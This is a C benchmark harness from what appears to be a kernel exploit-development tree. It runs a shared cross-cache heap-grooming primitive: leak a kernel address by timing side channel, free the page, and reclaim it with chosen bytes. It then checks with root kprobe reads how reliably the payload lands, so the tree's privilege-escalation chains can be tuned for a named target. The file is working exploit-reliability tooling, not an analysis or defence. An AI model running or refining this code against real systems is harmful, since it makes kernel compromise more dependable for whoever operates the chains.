/* How often the cross-cache placement lands, with root as the judge.
 *
 * Several chains in this tree take a page away from one allocator cache and
 * refill it from another: allocate so that a page is ours alone, leak one
 * address through a timing side channel, free the page, and reclaim it with an
 * allocation of a different size carrying bytes we chose. They all reach that
 * sequence through one shared implementation, so its landing rate is a property
 * every one of them inherits.
 *
 * None of them can measure it. Each is blind to its own placement: the bytes go
 * to an address a groom named, and the first sign of a miss is a later step
 * failing for reasons nothing can attribute. Asking a chain to check its own
 * work costs a won race per sample, which on this target is budgeted at
 * hundreds of attempts -- about one exploit per data point.
 *
 * A privileged run does not have that problem. It reads the page and sees
 * whether the payload is there. That is ground truth rather than an inference
 * through an exploit primitive: no race to win, no kernel pointer to move and
 * put back, no attempt budget, and nothing to restore. A sample costs one
 * groom.
 *
 * Root is used only to observe, and the placement performed is the shared one
 * exactly as the chains perform it -- so a change that moves this number moves
 * theirs. Nothing here escalates, and no exploit primitive is used or needed.
 */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

#include "../lib/spray/crosscache/crosscache.h"
#include "../lib/rw/kprobe_read.h"
#include "../lib/base/outcome.h"
#include "../lib/target.h"

/* The reclaiming allocation's size, and where in it the payload records the
 * page it was composed for.
 *
 * A payload built only from absolute addresses is identical whichever page it
 * lands on, so reading one back proves that some payload is present and not
 * that this one is. The page's own address can only have been written after the
 * groom named that page, which is exactly the claim under test. The offset is
 * arbitrary except that it must be inert -- nothing on this page is interpreted
 * by the kernel, so any offset inside the allocation will do. */
#ifndef BENCH_SEND_BYTES
#define BENCH_SEND_BYTES  0x8000
#endif
#ifndef BENCH_SELFNAME_OFF
#define BENCH_SELFNAME_OFF 0x7800
#endif

struct tally {
    unsigned grooms;     /* the side channel produced an address        */
    unsigned no_address; /* it did not, so there was nothing to place   */
    unsigned landed;     /* the page held the payload composed for it   */
    unsigned missed;     /* it did not                                  */
    unsigned unreadable; /* the judge could not read the page at all    */
    unsigned live_obj;   /* leaked address named a live kernel object    */
    unsigned dead_obj;   /* it did not -- the address itself was wrong    */
    unsigned filler_ok;  /* the page came back to us before being filled  */
    unsigned filler_bad; /* it did not                                    */
};

/* A groom opens thousands of descriptors. Without headroom a later round fails
 * to open its sockets, which reads as a placement failure and is not one. */
static void raise_descriptor_limit(void)
{
    struct rlimit limit;

    if (getrlimit(RLIMIT_NOFILE, &limit) == 0) {
        limit.rlim_cur = limit.rlim_max;
        setrlimit(RLIMIT_NOFILE, &limit);
    }
}

/* Compose the payload for whichever page the groom named.
 *
 * Everything else on the page is zero. What matters is that the page records
 * its own address: a payload built only from constants is identical wherever it
 * lands, so reading one back proves some payload is present and not that this
 * one is. */
/* How many of `n` words at `addr` look like kernel pointers.
 *
 * A live kernel object of this size is full of them -- list heads, locks,
 * pointers to other structures. An address that names nothing in particular is
 * not. This is a heuristic, so the count is reported rather than turned into a
 * verdict, and the raw words go in the log for anyone who wants to disagree. */
static int bench_kptr_count(uint64_t addr, uint64_t *words, size_t n)
{
    int found = 0;

    for (size_t i = 0; i < n; i++) {
        if (lib_kprobe_read64(addr + i * sizeof(uint64_t), &words[i]))
            return -1;
        if (words[i] >= UINT64_C(0xffffff8000000000))
            found++;
    }
    return found;
}

/* Two different questions, at the only two moments each can be asked.
 *
 * A miss has two causes that look identical afterwards: the refill did not take
 * the page, or the address never named our page at all. Counting them together
 * blames the refill for what the side channel did -- and the leak's own check
 * only rejects addresses of the wrong SHAPE, as its comment says.
 *
 * At LEAKED the victim is still allocated, so reading it tests the address
 * directly. At HELD the page is held by filler, so reading it tests whether the
 * page came back -- which, for a method that leaked late, cannot be separated
 * from the address having been wrong all along. */
static void bench_inspect(enum crosscache_stage stage, uintptr_t leaked,
                          uintptr_t base, void *user)
{
    struct tally *t = user;
    uint64_t words[8] = { 0 };

    if (stage == CROSSCACHE_STAGE_LEAKED) {
        int kptrs = bench_kptr_count((uint64_t)leaked, words, 8);

        if (kptrs < 0) {
            printf("    leak-probe unreadable at 0x%016llx\n",
                   (unsigned long long)leaked);
            return;
        }
        if (kptrs >= 2)
            t->live_obj++;
        else
            t->dead_obj++;
        printf("    leaked=0x%016llx kptrs=%d/8 w0=0x%016llx w1=0x%016llx\n",
               (unsigned long long)leaked, kptrs, (unsigned long long)words[0],
               (unsigned long long)words[1]);
        return;
    }

    if (lib_kprobe_read64((uint64_t)base + BENCH_SELFNAME_OFF, &words[0]))
        return;
    if (words[0] == CROSSCACHE_FILLER_WORD)
        t->filler_ok++;
    else
        t->filler_bad++;
    printf("    held=0x%016llx filler=%s (0x%016llx)\n", (unsigned long long)base,
           words[0] == CROSSCACHE_FILLER_WORD ? "ok" : "ABSENT",
           (unsigned long long)words[0]);
}

static void bench_compose(void *page, size_t len, uintptr_t base, void *user)
{
    (void)user;
    crosscache_stamp_self(page, len, BENCH_SELFNAME_OFF, base);
}

/* One placement, judged.
 *
 * The page is read before the groom's state is released, not after. Which of
 * the `nspray` refill allocations took the page is not knowable from here, so
 * releasing all but one of them first could free the very page about to be
 * read -- scoring a higher spray count down for a reason that is an artefact of
 * the harness. Verifying first is correct for any count. */
static void bench_round(const struct crosscache_method *method,
                        const struct crosscache_request *req, int round,
                        struct tally *t)
{
    const char *verdict;
    uintptr_t base;
    uint64_t seen = 0;

    /* The runner reads forward progress from this: a groom is a long silence
     * otherwise, and silence cannot be told from a stall. */
    printf("BENCH_ROUND attempt=%d method=%s nspray=%zu\n", round, method->name,
           req->nspray);

    base = crosscache_place_with(method, req);
    if (!base) {
        crosscache_cleanup();
        t->no_address++;
        printf("  %5d  %-19s  %s\n", round, "-", "groom produced no page");
        return;
    }

    t->grooms++;
    if (lib_kprobe_read64((uint64_t)base + BENCH_SELFNAME_OFF, &seen)) {
        t->unreadable++;
        verdict = "page could not be read";
    } else if (seen == (uint64_t)base) {
        t->landed++;
        verdict = "LANDED";
    } else {
        t->missed++;
        verdict = "page was not ours";
    }
    printf("  %5d  0x%016llx  %s\n", round, (unsigned long long)base, verdict);
    if (seen && seen != (uint64_t)base)
        printf("         read 0x%016llx\n", (unsigned long long)seen);

    /* Now that it has been judged, release everything the groom and the refill
     * allocated. Nothing in the kernel was ever made to point at this page, so
     * there is nothing to put back -- and releasing it is what lets the next
     * groom have it. */
    crosscache_cleanup();
}

static void bench_series(const struct crosscache_method *method,
                         const struct crosscache_cfg *cfg, size_t nspray,
                         int rounds, struct tally *t)
{
    struct crosscache_request req;

    memset(t, 0, sizeof(*t));
    memset(&req, 0, sizeof(req));
    req.cfg = *cfg;
    req.compose = bench_compose;
    req.inspect = bench_inspect;
    req.user = t;
    req.send_bytes = BENCH_SEND_BYTES;
    req.nspray = nspray;

    printf("\n");
    printf("  method %s, %zu refill send%s per placement -- %s\n", method->name,
           nspray, nspray == 1 ? "" : "s", method->summary);
    printf("  round  page                 verdict\n");
    printf("  -----  -------------------  --------------------------------\n");
    for (int round = 1; round <= rounds; round++)
        bench_round(method, &req, round, t);
    printf("  -----  -------------------  --------------------------------\n");
}

/* Parse "1,2,4,8" into the spray counts to try, in order. */
static size_t parse_sweep(const char *text, size_t *out, size_t max)
{
    size_t n = 0;

    while (*text && n < max) {
        char *end;
        unsigned long v = strtoul(text, &end, 0);

        if (end == text)
            break;
        if (v >= 1)
            out[n++] = (size_t)v;
        text = (*end == ',') ? end + 1 : end;
    }
    return n;
}

int main(int argc, char **argv)
{
    struct crosscache_cfg cfg = CROSSCACHE_CFG_PANTHER_61;
    const struct crosscache_method *chosen[4];
    size_t sprays[8] = { 1 };
    size_t nsweep = 1, nmethod = 0;
    struct tally t[4][8];
    int rounds = 20;
    unsigned judged_total = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    for (int i = 1; i + 1 < argc; i++) {
        if (!strcmp(argv[i], "--rounds")) {
            rounds = (int)strtol(argv[i + 1], NULL, 0);
            if (rounds < 1)
                rounds = 1;
        } else if (!strcmp(argv[i], "--nspray")) {
            sprays[0] = (size_t)strtoul(argv[i + 1], NULL, 0);
            if (!sprays[0])
                sprays[0] = 1;
            nsweep = 1;
        } else if (!strcmp(argv[i], "--sweep")) {
            size_t n = parse_sweep(argv[i + 1], sprays,
                                   sizeof(sprays) / sizeof(sprays[0]));

            if (n)
                nsweep = n;
        } else if (!strcmp(argv[i], "--method")) {
            const char *s = argv[i + 1];

            nmethod = 0;
            while (*s && nmethod < sizeof(chosen) / sizeof(chosen[0])) {
                char name[32];
                size_t k = 0;

                while (*s && *s != ',' && k + 1 < sizeof(name))
                    name[k++] = *s++;
                name[k] = '\0';
                if (*s == ',')
                    s++;
                chosen[nmethod] = crosscache_method_named(name);
                if (!chosen[nmethod]) {
                    printf("BENCH_GATE_FAIL reason=unknown_method name=%s\n", name);
                    return LIB_OUTCOME_USAGE;
                }
                nmethod++;
            }
        }
    }
    if (!nmethod) {
        /* No choice made: measure every method there is, which is what a
         * comparison wants and costs nothing extra to state. */
        size_t available;
        const struct crosscache_method *all = crosscache_methods(&available);

        for (size_t i = 0; i < available && i < sizeof(chosen) / sizeof(chosen[0]); i++)
            chosen[nmethod++] = &all[i];
    }

    if (!lib_kprobe_read_available()) {
        printf("BENCH_GATE_FAIL reason=no_privileged_read uid=%d\n", (int)geteuid());
        printf("RESULT this measures placements by reading the placed page, which\n"
               "RESULT needs root and a mounted tracing interface. Neither is used\n"
               "RESULT to place anything -- only to judge what was placed.\n");
        return LIB_OUTCOME_PRECONDITION_FAIL;
    }
    raise_descriptor_limit();
    cfg.mm_struct_sz = MM_STRUCT_SZ;
    cfg.mm_order = MM_ORDER;

    printf("\n");
    printf("  cross-cache placement, judged by reading the placed page at page+%#x\n",
           (unsigned)BENCH_SELFNAME_OFF);
    printf("  %d round%s at each of %zu method%s x %zu refill count%s\n", rounds,
           rounds == 1 ? "" : "s", nmethod, nmethod == 1 ? "" : "s", nsweep,
           nsweep == 1 ? "" : "s");
    for (size_t m = 0; m < nmethod; m++)
        printf("  method %-7s applies when %s\n", chosen[m]->name, chosen[m]->applies);

    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++)
            bench_series(chosen[m], &cfg, sprays[s], rounds, &t[m][s]);

    printf("\n  method   nspray  rounds  landed  rate   no page  unreadable\n");
    printf("  -------  ------  ------  ------  -----  -------  ----------\n");
    for (size_t m = 0; m < nmethod; m++) {
        for (size_t s = 0; s < nsweep; s++) {
            unsigned judged = t[m][s].landed + t[m][s].missed;

            judged_total += judged;
            printf("  %-7s  %6zu  %6d  %6u  ", chosen[m]->name, sprays[s], rounds,
                   t[m][s].landed);
            if (judged)
                printf("%4u%%", t[m][s].landed * 100 / judged);
            else
                printf("   - ");
            printf("  %7u  %10u\n", t[m][s].no_address, t[m][s].unreadable);
        }
    }
    printf("  -------  ------  ------  ------  -----  -------  ----------\n\n");

    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++) {
            unsigned judged = t[m][s].landed + t[m][s].missed;

            printf("RESULT method=%s nspray=%zu  landed %u / %u judged",
                   chosen[m]->name, sprays[s], t[m][s].landed, judged);
            if (judged)
                printf("  (%u%%)", t[m][s].landed * 100 / judged);
            printf("   [no page %u, unreadable %u | leaked-object live %u dead %u"
                   " | filler ok %u absent %u]\n",
                   t[m][s].no_address, t[m][s].unreadable, t[m][s].live_obj,
                   t[m][s].dead_obj, t[m][s].filler_ok, t[m][s].filler_bad);
        }
    if (!judged_total)
        printf("RESULT no round could be judged, so nothing was measured.\n");
    else
        printf("CROSSCACHE_BENCH_JUDGED rounds=%u\n", judged_total);
    printf("\n");
    for (size_t m = 0; m < nmethod; m++)
        for (size_t s = 0; s < nsweep; s++)
            printf("CROSSCACHE_BENCH_TOTAL method=%s nspray=%zu rounds=%d landed=%u "
                   "judged=%u no_page=%u unreadable=%u live_obj=%u dead_obj=%u "
                   "filler_ok=%u filler_bad=%u\n",
                   chosen[m]->name, sprays[s], rounds, t[m][s].landed,
                   t[m][s].landed + t[m][s].missed, t[m][s].no_address,
                   t[m][s].unreadable, t[m][s].live_obj, t[m][s].dead_obj,
                   t[m][s].filler_ok, t[m][s].filler_bad);

    return judged_total ? LIB_OUTCOME_PASS : LIB_OUTCOME_REFUSED;
}
